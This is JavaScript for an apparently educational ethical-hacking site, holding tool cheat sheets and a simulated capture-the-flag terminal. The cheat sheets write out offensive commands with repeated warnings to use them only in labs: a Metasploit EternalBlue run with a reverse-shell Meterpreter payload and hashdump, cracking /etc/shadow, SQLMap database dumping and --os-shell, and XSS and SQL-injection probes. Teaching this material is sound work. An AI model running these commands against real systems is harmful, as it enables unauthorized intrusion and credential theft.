/* ═══════════ HELPERS ═══════════ */
const $  = (s, c = document) => c.querySelector(s);
const $$ = (s, c = document) => [...c.querySelectorAll(s)];
const esc = s => s.replace(/</g, '&lt;').replace(/>/g, '&gt;');
const sleep = ms => new Promise(r => setTimeout(r, ms));

$('#year').textContent = new Date().getFullYear();
addEventListener('scroll', () => $('#nav').classList.toggle('scrolled', scrollY > 40), { passive: true });

/* ═══════════ SCROLL REVEAL ═══════════ */
const io = new IntersectionObserver(es => es.forEach(e => {
    if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); }
}), { threshold: .12 });
$$('.reveal').forEach(el => io.observe(el));

/* ═══════════ SCRAMBLE TITLES ═══════════ */
const CHARS = '█▓▒░<>/\\|#$%&@!?=+*01';
function scramble(el) {
    const final = el.dataset.text || el.textContent;
    let frame = 0, total = Math.max(18, final.length * 2);
    const tick = () => {
        const done = Math.floor((frame / total) * final.length);
        el.textContent = final.slice(0, done) +
        [...final.slice(done)].map(c => c === ' ' ? ' ' : CHARS[Math.random() * CHARS.length | 0]).join('');
        if (frame++ <= total) requestAnimationFrame(tick); else el.textContent = final;
    };
        tick();
}
const sio = new IntersectionObserver(es => es.forEach(e => {
    if (e.isIntersecting) { scramble(e.target); sio.unobserve(e.target); }
}), { threshold: .6 });
$$('.scramble, .scramble-io').forEach(el => sio.observe(el));

$$('.topic').forEach(t => t.addEventListener('mousemove', e => {
    const r = t.getBoundingClientRect();
    t.style.setProperty('--mx', (e.clientX - r.left) + 'px');
    t.style.setProperty('--my', (e.clientY - r.top) + 'px');
}));

/* ═══════════ TOOL CODE DATABASE ═══════════
 Clicking a tool card opens its full install *+ usage code. */
const TOOL_DATA = {
    nmap: {
        file: 'nmap_commands.sh', cat: 'RECON', name: 'Nmap',
        desc: 'The #1 network scanner. Maps hosts, open ports, services and versions. Your very first step in any authorized engagement.',
        code:
        `# ─── INSTALL ───────────────────────────────────────
        sudo apt update
        sudo apt install nmap          # pre-installed on Kali Linux

        # ─── BASIC SCANS (your own network / labs ONLY) ────
        nmap 192.168.1.10              # scan one host
        nmap 192.168.1.0/24            # scan a whole subnet

        # ─── PORT SCANNING ─────────────────────────────────
        nmap -p- 192.168.1.10          # all 65535 ports (slow but complete)
        nmap -p 22,80,443 192.168.1.10 # only specific ports
        nmap --top-ports 100 TARGET    # the 100 most common ports

        # ─── SERVICE & VERSION DETECTION ───────────────────
        nmap -sV TARGET                # what software runs on each port
        nmap -sC TARGET                # run default safe scripts
        nmap -A TARGET                 # aggressive: OS + versions + scripts

        # ─── SAVE YOUR RESULTS ─────────────────────────────
        nmap -oN scan.txt TARGET       # normal text
        nmap -oX scan.xml TARGET       # XML (for other tools)

        # ─── BEGINNER TIP ──────────────────────────────────
        # Start with:  nmap -sV -sC -oN myscan.txt <lab-ip>
        # Practice targets: TryHackMe rooms, HackTheBox machines.`
    },

    wireshark: {
        file: 'wireshark_notes.sh', cat: 'ANALYSIS', name: 'Wireshark',
        desc: 'The world\'s most used packet analyzer. Watch every byte that crosses a network — essential for understanding protocols.',
        code:
        `# ─── INSTALL ───────────────────────────────────────
        sudo apt install wireshark     # GUI version
        sudo apt install tshark        # command-line version

        # ─── LAUNCH ────────────────────────────────────────
        wireshark                      # open GUI, pick your interface
        sudo wireshark                 # only if your user lacks capture rights
        tshark -i eth0 -c 100          # capture 100 packets in terminal

        # ─── CAPTURE FROM TERMINAL ─────────────────────────
        tshark -i eth0 -w capture.pcap            # save to file
        tshark -r capture.pcap                    # read a capture
        tshark -i eth0 -f "port 80"               # capture filter

        # ─── DISPLAY FILTERS (type in the filter bar) ──────
        http                            # only HTTP traffic
        dns                             # only DNS queries
        tcp.port == 80                  # traffic on port 80
        ip.addr == 192.168.1.10         # traffic to/from one IP
        http.request.method == "POST"   # form submissions (look for passwords!)

        # ─── BEGINNER EXERCISE ─────────────────────────────
        # 1. Start capture on your Wi-Fi interface
        # 2. Visit an http:// (not https) test site
        # 3. Filter: http  → right-click a packet → Follow → HTTP Stream
        # 4. See how cleartext exposes everything. Learn why TLS matters.`
    },

    burpsuite: {
        file: 'burpsuite_setup.sh', cat: 'WEB', name: 'Burp Suite',
        desc: 'The standard web-hacking proxy. Intercept, inspect and modify HTTP requests between your browser and the target. Practice ONLY on PortSwigger Academy labs or DVWA.',
        code:
        `# ─── INSTALL ───────────────────────────────────────
        sudo apt install burpsuite     # Kali / Debian
        # Or download free Community Edition:
        #   https://portswigger.net/burp/communitydownload

        # ─── FIRST-TIME SETUP ──────────────────────────────
        # 1. Launch Burp → Proxy → Intercept → "Intercept is ON"
        # 2. In your browser set proxy:  127.0.0.1  port 8080
        #    (Firefox: Settings → Network Settings → Manual proxy)
        # 3. Browse to  http://burp  → download CA certificate
        # 4. Import cert as trusted → now Burp can see HTTPS too

        # ─── CORE WORKFLOW ─────────────────────────────────
        # Proxy tab      → watch/hold/edit every request
        # Forward button → send the (modified) request onward
        # Repeater tab   → resend one request again & again
        # Intruder tab   → automate fuzzing (Community: rate-limited)

        # ─── WHAT TO LOOK FOR (OWASP Top 10) ───────────────
        # - Change ?id=1 to ?id=2        → broken access control?
        # - Add a ' quote to a parameter → SQL error? (SQLi)
        # - Inject <script>alert(1)</script> → XSS?
        # - Change prices/roles in hidden fields

        # ─── LEGAL PRACTICE (free) ─────────────────────────
        # https://portswigger.net/web-security   ← official labs
        # DVWA: https://github.com/digininja/DVWA  (run locally)`
    },

    metasploit: {
        file: 'metasploit_console.sh', cat: 'EXPLOIT', name: 'Metasploit',
        desc: 'The most famous exploitation framework. Powerful — so it comes with big responsibility. Use it ONLY on lab machines you are allowed to attack.',
        code:
        `# ─── INSTALL ───────────────────────────────────────
        # Pre-installed on Kali. Otherwise:
        sudo apt install metasploit-framework

        # ─── LAUNCH THE CONSOLE ────────────────────────────
        msfconsole

        # ─── INSIDE msfconsole ─────────────────────────────
        help                              # see all commands
        search eternalblue                # search for modules
        search type:exploit name:smb      # refine searches

        # ─── TYPICAL FLOW (against a LAB machine) ──────────
        use exploit/windows/smb/ms17_010_eternalblue
        show options                      # what must be configured?
        set RHOSTS 10.10.10.40            # target IP (the lab box)
        set LHOST 10.10.14.7              # YOUR IP
        set PAYLOAD windows/x64/meterpreter/reverse_tcp
        run                               # launch

        # ─── IF YOU GET A METERPRETER SHELL ────────────────
        sysinfo                           # target info
        getuid                            # which user are you?
        hashdump                          # dump password hashes
        screenshot                        # take a screenshot
        exit                              # leave cleanly

        # ─── GOLDEN RULE ───────────────────────────────────
        # RHOSTS must ALWAYS be a lab target you own or were
        # given written permission to test. Never real hosts.`
    },

    john: {
        file: 'john_the_ripper.sh', cat: 'PASSWORDS', name: 'John the Ripper',
        desc: 'Classic offline password cracker. Perfect for learning how hashes die. Crack only hash files from labs or ones you created yourself.',
        code:
        `# ─── INSTALL ───────────────────────────────────────
        sudo apt install john

        # ─── MAKE YOUR OWN TEST HASH (safe!) ───────────────
        echo -n "password123" | md5sum
        # output: 482c811da5d5b4bc6d497ffa98491e38  -
        echo '482c811da5d5b4bc6d497ffa98491e38' > hashes.txt

        # ─── CRACK WITH A WORDLIST ─────────────────────────
        john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
        # (on non-Kali, download rockyou.txt.gz and gunzip it)

        # ─── USEFUL COMMANDS ───────────────────────────────
        john --show hashes.txt            # show already-cracked
        john --format=raw-md5 hashes.txt  # force hash format
        john --incremental hashes.txt     # pure brute force (slow)

        # ─── LINUX SHADOW FILES (your own VM only) ─────────
        sudo unshadow /etc/passwd /etc/shadow > unshadowed.txt
        john --wordlist=rockyou.txt unshadowed.txt

        # ─── LESSON ────────────────────────────────────────
        # "password123" dies in milliseconds.
        # Try cracking a 16-char random string → watch it fail.
        # That's why length + randomness win.`
    },

    hashcat: {
        file: 'hashcat_commands.sh', cat: 'PASSWORDS', name: 'Hashcat',
        desc: 'The fastest hash cracker on earth — uses your GPU. Same rule as John: lab hashes and your own test files only.',
        code:
        `# ─── INSTALL ───────────────────────────────────────
        sudo apt install hashcat

        # ─── PUT A HASH IN A FILE ──────────────────────────
        echo '5f4dcc3b5aa765d61d8327deb882cf99' > hash.txt
        # ^ that's md5("password") — a classic test hash

        # ─── DICTIONARY ATTACK ─────────────────────────────
        hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
        # -m 0 = MD5 (the "mode" tells hashcat the hash type)

        # ─── COMMON MODES ──────────────────────────────────
        # -m 0     MD5
        # -m 100   SHA1
        # -m 1000  NTLM (Windows passwords)
        # -m 1800  sha512crypt (Linux /etc/shadow)
        # full list:  hashcat --example-hashes | less

        # ─── VIEW RESULTS ──────────────────────────────────
        hashcat -m 0 hash.txt --show

        # ─── RULES (mutate the wordlist) ───────────────────
        hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

        # ─── WHY IT MATTERS ────────────────────────────────
        # A modern GPU tries BILLIONS of MD5 guesses per second.
        # Weak password = instant compromise. Teach your users!`
    },

    sqlmap: {
        file: 'sqlmap_commands.sh', cat: 'WEB', name: 'SQLMap',
        desc: 'Automated SQL injection detection and exploitation. Running this against a real site without permission is a crime — use DVWA, PortSwigger labs or CTF boxes.',
        code:
        `# ─── INSTALL ───────────────────────────────────────
        sudo apt install sqlmap
        # or from source:
        git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git

        # ─── TEST A URL (AUTHORIZED LAB ONLY!) ─────────────
        sqlmap -u "http://10.10.10.10/vuln.php?id=1"

        # ─── ENUMERATE THE DATABASE ────────────────────────
        sqlmap -u "URL?id=1" --dbs              # list databases
        sqlmap -u "URL?id=1" -D mydb --tables   # list tables
        sqlmap -u "URL?id=1" -D mydb -T users --columns

        # ─── DUMP DATA ─────────────────────────────────────
        sqlmap -u "URL?id=1" -D mydb -T users --dump

        # ─── POST REQUESTS + COOKIES ───────────────────────
        sqlmap -u "URL" --data="user=admin&pass=test" -p user
        sqlmap -u "URL?id=1" --cookie="PHPSESSID=abc123"

        # ─── USEFUL FLAGS ──────────────────────────────────
        --level=3 --risk=2     # deeper, riskier tests
        --batch                # auto-answer prompts
        --os-shell             # try to get a shell (CTF boxes)

        # ─── LEGAL PLAYGROUND ──────────────────────────────
        # Install DVWA locally, set security to "low",
        # then point sqlmap at it. Never at real websites.`
    },

    ffuf: {
        file: 'ffuf_gobuster.sh', cat: 'RECON', name: 'FFuF / Gobuster',
        desc: 'Content discovery: brute-forces hidden files, folders and subdomains on a web server using wordlists. Both tools are free; only point them at authorized targets.',
        code:
        `# ─── INSTALL ───────────────────────────────────────
        sudo apt install ffuf gobuster
        sudo apt install wordlists        # /usr/share/wordlists/

        # ─── FFUF: DIRECTORY BRUTE FORCE ───────────────────
        ffuf -u http://LAB-IP/FUZZ -w /usr/share/wordlists/dirb/common.txt

        # FUZZ is the placeholder that gets replaced by each word.
        # Clean up noise:
        ffuf -u http://LAB-IP/FUZZ -w common.txt -fc 404     # hide 404s
        ffuf -u http://LAB-IP/FUZZ -w common.txt -mc 200,301 # only hits

        # ─── FFUF: FILE EXTENSIONS ─────────────────────────
        ffuf -u http://LAB-IP/index.FUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt

        # ─── GOBUSTER: SAME JOB, DIFFERENT STYLE ───────────
        gobuster dir -u http://LAB-IP -w /usr/share/wordlists/dirb/common.txt
        gobuster dir -u http://LAB-IP -w common.txt -x php,txt,bak

        # ─── SUBDOMAIN ENUMERATION (bug bounty scope only!)
        gobuster dns -d example.com -w subdomains.txt

        # ─── BETTER WORDLISTS ──────────────────────────────
        git clone https://github.com/danielmiessler/SecLists.git
        ffuf -u http://LAB-IP/FUZZ -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

        # ─── TIP ───────────────────────────────────────────
        # Hidden files like /backup.zip, /.env, /admin often
        # win beginner CTF boxes. Recon wins games.`
    }
};

/* ═══════════ MODAL LOGIC ═══════════ */
const modal = $('#toolModal');
let lastFocused = null;

function openTool(key) {
    const t = TOOL_DATA[key];
    if (!t) return;
    $('#modalFile').textContent  = t.file;
    $('#modalCat').textContent   = t.cat;
    $('#modalTitle').textContent = t.name;
    $('#modalDesc').textContent  = t.desc;
    $('#modalCode').textContent  = t.code;
    const copyBtn = $('#copyBtn');
    copyBtn.textContent = '[ COPY ]';
    copyBtn.classList.remove('copied');

    lastFocused = document.activeElement;
    modal.classList.add('open');
    modal.setAttribute('aria-hidden', 'false');
    document.body.style.overflow = 'hidden';
    $('.modal-x').focus();
}

function closeTool() {
    modal.classList.remove('open');
    modal.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
    if (lastFocused) lastFocused.focus();
}

/* card click + keyboard (Enter/Space) */
$$('.tool').forEach(card => {
    card.addEventListener('click', () => openTool(card.dataset.tool));
    card.addEventListener('keydown', e => {
        if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); openTool(card.dataset.tool); }
    });
});

/* close via ✕, backdrop, or ESC */
$$('[data-close]').forEach(el => el.addEventListener('click', closeTool));
addEventListener('keydown', e => {
    if (e.key === 'Escape' && modal.classList.contains('open')) closeTool();
});

/* copy button */
$('#copyBtn').addEventListener('click', async () => {
    const btn = $('#copyBtn'), text = $('#modalCode').textContent;
    try {
        await navigator.clipboard.writeText(text);
    } catch {
        const ta = document.createElement('textarea');
        ta.value = text; document.body.appendChild(ta);
        ta.select(); document.execCommand('copy'); ta.remove();
    }
    btn.textContent = '[ COPIED ✓ ]';
    btn.classList.add('copied');
    setTimeout(() => { btn.textContent = '[ COPY ]'; btn.classList.remove('copied'); }, 1800);
});

/* ═══════════ HERO BOOT SEQUENCE ═══════════ */
const bootLines = [
    { t: 'cmd',  s: 'whoami' },
{ t: 'out',  s: 'guest_user — clearance: BEGINNER' },
{ t: 'cmd',  s: './init --career=ethical-hacker' },
{ t: 'ok',   s: '[✓] curiosity.module ............ loaded' },
{ t: 'ok',   s: '[✓] persistence.module ........... loaded' },
{ t: 'warn', s: '[!] imposter_syndrome detected ... neutralized' },
{ t: 'ok',   s: '[✓] legal_guardrails ............. enforced' },
{ t: 'cmd',  s: 'status --future' },
{ t: 'hi',   s: '> 0 exploits written. 1 journey started.' },
{ t: 'out',  s: '> scroll down to begin, recruit. ↓' },
];
(async function boot() {
    const term = $('#bootTerm'); if (!term) return;
    await sleep(600);
    for (const line of bootLines) {
        if (line.t === 'cmd') {
            const div = document.createElement('div');
            div.className = 'tl-cmd'; term.appendChild(div);
            for (const ch of line.s) { div.textContent += ch; await sleep(34); }
            await sleep(260);
        } else {
            const div = document.createElement('div');
            div.className = 'tl-' + line.t; div.textContent = line.s;
            term.appendChild(div); await sleep(230);
        }
    }
    const c = document.createElement('span'); c.className = 'cursor'; term.appendChild(c);
})();

/* ═══════════ LIVE LAB TERMINAL ═══════════ */
const out = $('#labOut'), form = $('#labForm'), input = $('#labCmd');
const state = { scanned: false, cracked: false };

function print(html, cls = 'tl-out') {
    const d = document.createElement('div');
    d.className = cls; d.innerHTML = html;
    out.appendChild(d); out.scrollTop = out.scrollHeight;
}
print('<span class="tl-hi">NULLBYTE LAB v1.0</span> — simulated environment. Nothing here touches a real network.');
print('Type <span class="tl-ok">help</span> to see available commands.');

function crackTime(len, set) {
    const secs = Math.pow(set, len) / 4e9;
    if (secs < 1) return 'instantly ⚡';
    const u = [['century', 3.15e9], ['year', 3.15e7], ['day', 86400], ['hour', 3600], ['minute', 60]];
    for (const [name, s] of u) if (secs / s >= 1) {
        const v = secs / s;
        return v > 999 ? `${Math.round(v).toLocaleString()} ${name}s` : `~${Math.round(v)} ${name}${v >= 2 ? 's' : ''}`;
    }
    return `~${Math.round(secs)} seconds`;
}

const commands = {
    help: () => {
        print('Available commands:', 'tl-hi');
        print('&nbsp; scan &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;— recon the target');
        print('&nbsp; crack &lt;pass&gt; — estimate cracking time');
        print('&nbsp; hint / flag / whoami / skills / sudo / clear / ls');
    },
    whoami: () => print('guest — a future security professional. (currently: curious)'),
    skills: () => print('skills loaded: [google-fu: 12%] [linux: 3%] [confidence: fluctuating]'),
    ls: () => print('roadmap/ &nbsp;tools/ &nbsp;ethics.txt &nbsp;flag.enc'),
    scan: () => {
        state.scanned = true;
        print('Starting Nmap 7.94 scan against 10.10.14.7 ...', 'tl-cmd');
        print('22/tcp &nbsp;open &nbsp;ssh &nbsp;&nbsp;&nbsp;&nbsp;OpenSSH 8.9');
        print('80/tcp &nbsp;open &nbsp;http &nbsp;&nbsp;&nbsp;<span class="tl-warn">login portal → weak credentials suspected</span>');
        print('<span class="tl-ok">scan complete.</span> Next: <span class="tl-ok">crack admin123</span>');
    },
    hint: () => print(state.cracked
    ? 'You already cracked it. Now run: <span class="tl-ok">flag</span>'
    : state.scanned ? 'Try: <span class="tl-ok">crack admin123</span>'
    : 'Recon first. Try: <span class="tl-ok">scan</span>'),
    crack: (arg) => {
        const pw = arg || '';
        if (!pw) return print('usage: crack &lt;password&gt;');
        let set = 26;
        if (/[A-Z]/.test(pw)) set += 26;
        if (/[0-9]/.test(pw)) set += 10;
        if (/[^A-Za-z0-9]/.test(pw)) set += 32;
        print(`target: "${esc(pw)}" | charset: ${set} | length: ${pw.length}`, 'tl-hi');
        if (pw.toLowerCase() === 'admin123') {
            state.cracked = true;
            print('<span class="tl-warn">⚠ MATCH in 0.0003s</span> — admin:admin123 accepted!', 'tl-ok');
            print('<span class="tl-ok">ACCESS GRANTED.</span> Run <span class="tl-ok">flag</span>.');
        } else {
            print(`estimated crack time @ 4B/sec: <b class="tl-warn">${crackTime(pw.length, set)}</b>`);
            print(pw.length >= 12 ? '<span class="tl-ok">Strong. Length wins.</span> (try <span class="tl-ok">crack admin123</span> to finish)'
            : '<span class="tl-warn">Weak passwords fall fast — that\'s the lesson.</span>');
        }
    },
    flag: () => {
        if (state.scanned && state.cracked) {
            print('╔══════════════════════════════════╗', 'tl-ok');
            print('║ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;🚩 FLAG CAPTURED 🚩 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;║', 'tl-ok');
            print('╚══════════════════════════════════╝', 'tl-ok');
            print('<span class="tl-hi">NULLBYTE{y0ur_f1r5t_ctf_c0mpl3t3d}</span>');
        } else print('<span class="tl-warn">ACCESS DENIED.</span> Finish recon + crack first. Type <span class="tl-ok">hint</span>.');
    },
    sudo: () => print('guest is not in the sudoers file. This incident will be reported. 😄'),
    exit: () => print('nice try, recruit. the learning never exits.'),
};

form?.addEventListener('submit', async e => {
    e.preventDefault();
    const raw = input.value.trim(); if (!raw) return;
    input.value = '';
    print(esc(raw), 'tl-cmd');
    const [name, ...rest] = raw.split(/\s+/);
    const fn = commands[name.toLowerCase()];
    await sleep(120);
    if (fn) fn(rest.join(' '));
                       else print(`command not found: ${esc(name)} — try <span class="tl-ok">help</span>`);
});
$('.lab-term')?.addEventListener('click', () => input.focus());

/* ═══════════ FAQ ═══════════ */
$$('.faq-item').forEach(item => {
    const q = $('.faq-q', item), a = $('.faq-a', item);
    q.addEventListener('click', () => {
        const open = item.classList.toggle('open');
        q.setAttribute('aria-expanded', open);
        a.style.maxHeight = open ? a.scrollHeight + 'px' : 0;
    });
});

/* ═══════════ SCROLLSPY ═══════════ */
const spy = new IntersectionObserver(es => es.forEach(e => {
    if (e.isIntersecting) {
        $$('.nav-links a').forEach(a =>
        a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
    }
}), { rootMargin: '-40% 0px -55% 0px' });
$$('section[id]').forEach(s => spy.observe(s));
